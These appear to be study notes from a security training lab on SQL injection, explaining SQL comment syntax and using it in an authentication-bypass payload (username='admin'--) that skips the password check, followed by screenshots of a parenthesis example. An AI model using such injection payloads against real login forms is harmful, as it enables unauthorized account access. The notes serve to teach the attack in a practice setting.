## Comments

```sql
mysql> SELECT username FROM logins; -- Selects usernames from the logins table
```

The `#` symbol can be used as well.

```sql
mysql> SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```
## Auth Bypass with comments

```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
```
![](Pasted%20image%2020260617175721.png)
## Another Example
![Admin panel showing an SQL query execution: SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='437b930db84b8079c2dd804a71936b5f'; with a message: Login failed!](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/paranthesis_fail.png)

Let us try logging in with valid credentials `admin / p@ssw0rd` to see the response.

![Admin panel showing an SQL query execution: SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='0f359740bd1cda994f8b55330c86d845'; with a message: Login failed!](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/33/paranthesis_valid_fail.png)
